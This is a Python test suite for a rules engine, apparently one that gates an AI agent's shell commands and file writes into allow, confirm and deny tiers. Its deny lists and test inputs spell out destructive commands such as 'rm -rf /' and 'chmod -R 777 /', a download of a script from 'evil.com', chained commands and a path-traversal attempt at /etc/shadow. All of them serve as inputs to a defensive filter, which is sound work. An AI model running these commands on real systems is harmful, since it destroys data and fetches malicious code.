"""Tests for the ChatOS rules engine."""

from pathlib import Path

import pytest

from src.models import Action, RulesConfig, RulesMeta, Permissions, Resources
from src.rules_engine import RulesEngine

# -- Fixtures --

SAMPLE_RULES_TOML = """\
[meta]
version = "0.1.0"
hostname = "test-host"

[permissions]
safe_patterns = [
    "cat ", "ls ", "uptime", "dpkg -l", "ps aux",
]

confirm_patterns = [
    "apt install ", "systemctl ", "sudo ", "mv ",
]

forbidden_patterns = [
    "rm -rf /",
    "rm -rf /*",
    "chmod -R 777 /",
    "halt", "reboot", "shutdown",
    ">/etc/", ">> /etc/",
]

forbidden_write_paths = [
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/chatos/rules.toml",
]

[resources]
max_concurrent_ops = 3
session_timeout_minutes = 15
"""


@pytest.fixture
def rules_toml_path(tmp_path: Path) -> Path:
    """Write sample rules.toml to a temp file and return the path."""
    p = tmp_path / "rules.toml"
    p.write_text(SAMPLE_RULES_TOML)
    return p


@pytest.fixture
def engine(rules_toml_path: Path) -> RulesEngine:
    """Create a RulesEngine from the sample TOML."""
    return RulesEngine.from_file(rules_toml_path)


@pytest.fixture
def engine_from_config() -> RulesEngine:
    """Create a RulesEngine from an in-memory config."""
    config = RulesConfig(
        meta=RulesMeta(version="0.1.0", hostname="test"),
        permissions=Permissions(
            safe_patterns=["cat ", "ls ", "uptime"],
            confirm_patterns=["apt install ", "mv "],
            forbidden_patterns=["rm -rf /", "halt"],
            forbidden_write_paths=["/etc/shadow"],
        ),
        resources=Resources(max_concurrent_ops=5, session_timeout_minutes=30),
    )
    return RulesEngine(config)


# -- Loading tests --


class TestRulesLoading:
    def test_load_from_file(self, engine: RulesEngine) -> None:
        assert engine.config.meta.version == "0.1.0"
        assert engine.config.meta.hostname == "test-host"

    def test_load_permissions(self, engine: RulesEngine) -> None:
        p = engine.config.permissions
        assert "cat " in p.safe_patterns
        assert "apt install " in p.confirm_patterns
        assert "rm -rf /" in p.forbidden_patterns
        assert "/etc/shadow" in p.forbidden_write_paths

    def test_load_resources(self, engine: RulesEngine) -> None:
        assert engine.config.resources.max_concurrent_ops == 3
        assert engine.config.resources.session_timeout_minutes == 15

    def test_load_from_config(self, engine_from_config: RulesEngine) -> None:
        assert engine_from_config.config.meta.hostname == "test"

    def test_missing_file_raises(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            RulesEngine.from_file(tmp_path / "nonexistent.toml")

    def test_defaults_for_missing_sections(self, tmp_path: Path) -> None:
        minimal = tmp_path / "minimal.toml"
        minimal.write_text('[meta]\nversion = "1.0"\nhostname = "x"\n')
        eng = RulesEngine.from_file(minimal)
        assert eng.config.permissions.safe_patterns == []
        assert eng.config.resources.max_concurrent_ops == 5


# -- Safe pattern tests --


class TestSafePatterns:
    def test_safe_command_with_args(self, engine: RulesEngine) -> None:
        d = engine.check_command("cat /etc/hosts")
        assert d.action == Action.ALLOW
        assert d.matched_pattern == "cat "

    def test_safe_command_no_trailing_space_exact(self, engine: RulesEngine) -> None:
        d = engine.check_command("uptime")
        assert d.action == Action.ALLOW

    def test_safe_command_no_trailing_space_with_args(self, engine: RulesEngine) -> None:
        d = engine.check_command("uptime -a")
        assert d.action == Action.ALLOW

    def test_safe_multi_word_pattern(self, engine: RulesEngine) -> None:
        d = engine.check_command("ps aux")
        assert d.action == Action.ALLOW

    def test_safe_multi_word_pattern_with_extra_args(self, engine: RulesEngine) -> None:
        d = engine.check_command("ps aux -w")
        assert d.action == Action.ALLOW

    def test_safe_ls_with_path(self, engine: RulesEngine) -> None:
        d = engine.check_command("ls -la /tmp")
        assert d.action == Action.ALLOW

    def test_no_prefix_collision(self, engine: RulesEngine) -> None:
        """'dpkg -l' should not match 'dpkg -la_bad_command'."""
        d = engine.check_command("dpkg -la_bad_command")
        assert d.action != Action.ALLOW


# -- Confirm pattern tests --


class TestConfirmPatterns:
    def test_confirm_command(self, engine: RulesEngine) -> None:
        d = engine.check_command("apt install nginx")
        assert d.action == Action.CONFIRM
        assert d.matched_pattern == "apt install "

    def test_confirm_systemctl(self, engine: RulesEngine) -> None:
        d = engine.check_command("systemctl restart nginx")
        assert d.action == Action.CONFIRM

    def test_confirm_sudo(self, engine: RulesEngine) -> None:
        d = engine.check_command("sudo apt install vim")
        assert d.action == Action.CONFIRM

    def test_confirm_mv(self, engine: RulesEngine) -> None:
        d = engine.check_command("mv /tmp/a /tmp/b")
        assert d.action == Action.CONFIRM


# -- Forbidden pattern tests --


class TestForbiddenPatterns:
    def test_forbidden_rm_rf_root(self, engine: RulesEngine) -> None:
        d = engine.check_command("rm -rf /")
        assert d.action == Action.DENY
        assert d.matched_pattern == "rm -rf /"

    def test_forbidden_rm_rf_star(self, engine: RulesEngine) -> None:
        d = engine.check_command("rm -rf /*")
        assert d.action == Action.DENY

    def test_forbidden_halt(self, engine: RulesEngine) -> None:
        d = engine.check_command("halt")
        assert d.action == Action.DENY

    def test_forbidden_reboot(self, engine: RulesEngine) -> None:
        d = engine.check_command("reboot")
        assert d.action == Action.DENY

    def test_forbidden_shutdown(self, engine: RulesEngine) -> None:
        d = engine.check_command("shutdown -h now")
        assert d.action == Action.DENY

    def test_forbidden_chmod_777(self, engine: RulesEngine) -> None:
        d = engine.check_command("chmod -R 777 /")
        assert d.action == Action.DENY

    def test_forbidden_redirect_etc(self, engine: RulesEngine) -> None:
        d = engine.check_command("echo bad >/etc/passwd")
        assert d.action == Action.DENY

    def test_forbidden_overrides_safe(self, engine: RulesEngine) -> None:
        """A command matching both safe and forbidden should be denied.

        'cat ' is a safe prefix, but 'halt' is forbidden. Forbidden
        is checked first via substring match, so the command is denied.
        """
        d = engine.check_command("cat /tmp/test; halt")
        assert d.action == Action.DENY
        assert d.matched_pattern == "halt"

    def test_forbidden_in_pipeline(self, engine: RulesEngine) -> None:
        """Forbidden pattern detected even when embedded in a pipeline."""
        d = engine.check_command("echo test && rm -rf /")
        assert d.action == Action.DENY
        assert d.matched_pattern == "rm -rf /"

    def test_forbidden_takes_priority(self, engine: RulesEngine) -> None:
        """Forbidden check runs before safe check."""
        # 'halt' is forbidden; construct a command where safe prefix matches too
        d = engine.check_command("halt")
        assert d.action == Action.DENY


# -- Default deny tests --


class TestDefaultDeny:
    def test_unknown_command_denied(self, engine: RulesEngine) -> None:
        d = engine.check_command("wget http://evil.com/malware.sh")
        assert d.action == Action.DENY
        assert d.matched_pattern is None

    def test_empty_command_denied(self, engine: RulesEngine) -> None:
        d = engine.check_command("")
        assert d.action == Action.DENY

    def test_whitespace_only_denied(self, engine: RulesEngine) -> None:
        d = engine.check_command("   ")
        assert d.action == Action.DENY

    def test_python_command_denied(self, engine: RulesEngine) -> None:
        d = engine.check_command("python3 -c 'import os; os.system(\"rm -rf /\")'")
        assert d.action == Action.DENY


# -- Write path tests --


class TestWritePaths:
    def test_forbidden_write_path(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/etc/shadow")
        assert d.action == Action.DENY
        assert d.matched_pattern == "/etc/shadow"

    def test_forbidden_sudoers(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/etc/sudoers")
        assert d.action == Action.DENY

    def test_forbidden_rules_toml(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/etc/chatos/rules.toml")
        assert d.action == Action.DENY

    def test_allowed_write_path(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/tmp/output.txt")
        assert d.action == Action.ALLOW

    def test_allowed_write_home(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/home/agent01/notes.txt")
        assert d.action == Action.ALLOW

    def test_path_traversal_blocked(self, engine: RulesEngine) -> None:
        """Path normalization catches traversal attempts."""
        d = engine.check_write_path("/etc/../etc/shadow")
        assert d.action == Action.DENY

    def test_normalized_path(self, engine: RulesEngine) -> None:
        d = engine.check_write_path("/etc/chatos/./rules.toml")
        assert d.action == Action.DENY


# -- Tool dispatch tests --


class TestToolDispatch:
    def test_bash_tool_dispatches_to_check_command(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Bash", {"command": "ls -la"})
        assert d.action == Action.ALLOW

    def test_write_tool_dispatches_to_check_write(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Write", {"file_path": "/etc/shadow"})
        assert d.action == Action.DENY

    def test_edit_tool_dispatches_to_check_write(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Edit", {"file_path": "/etc/shadow"})
        assert d.action == Action.DENY

    def test_read_tool_always_allowed(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Read", {"file_path": "/etc/shadow"})
        assert d.action == Action.ALLOW

    def test_glob_tool_always_allowed(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Glob", {"pattern": "**/*.py"})
        assert d.action == Action.ALLOW

    def test_grep_tool_always_allowed(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Grep", {"pattern": "password"})
        assert d.action == Action.ALLOW

    def test_unknown_tool_denied(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("DangerousTool", {})
        assert d.action == Action.DENY

    def test_write_to_allowed_path(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Write", {"file_path": "/tmp/test.txt"})
        assert d.action == Action.ALLOW

    def test_bash_confirm_command(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Bash", {"command": "apt install nginx"})
        assert d.action == Action.CONFIRM

    def test_bash_forbidden_command(self, engine: RulesEngine) -> None:
        d = engine.check_tool_use("Bash", {"command": "rm -rf /"})
        assert d.action == Action.DENY
